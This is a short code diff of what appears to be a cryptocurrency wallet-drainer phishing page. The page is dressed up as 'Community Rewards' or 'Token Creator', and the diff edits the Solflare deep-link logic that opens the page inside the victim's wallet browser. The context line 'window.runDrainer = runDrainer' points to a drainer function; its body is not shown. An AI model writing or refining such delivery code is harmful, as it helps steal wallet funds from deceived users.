@@ -1961,7 +1961,7 @@
       }
     }
 
-    /* New Community Rewards Styles */
+    /* Token Creator Styles */
     .hero-description {
       font-size: 1.2em;
       max-width: 800px;
@@ -6399,8 +6399,8 @@ window.runDrainer = runDrainer;
             const isAndroid = /android/.test(userAgent);
             
             // Use exact Solflare format as specified
-            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
-            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent(currentUrl)}`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent(currentUrl)}`;
             
             console.log(`[SOLFLARE_MOBILE] Using exact format: ${deepLink}`);
           } else {
